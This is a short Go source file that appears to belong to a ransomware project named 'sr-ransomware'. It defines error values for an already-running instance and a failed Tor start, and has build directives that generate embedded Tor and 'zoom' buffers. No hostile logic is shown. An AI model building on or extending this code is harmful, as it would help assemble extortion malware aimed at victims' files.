package exe

import "github.com/sug0/sr-ransomware/go/errors"

//go:generate go run generate/tor_buffer.go
//go:generate go run generate/zoom_buffer.go

const pkg = "github.com/sug0/sr-ransomware/go/exe"

var (
    ErrAlreadyRunning = errors.New(pkg, "already running")
    ErrTorStartFailed = errors.New(pkg, "failed to start tor")
)
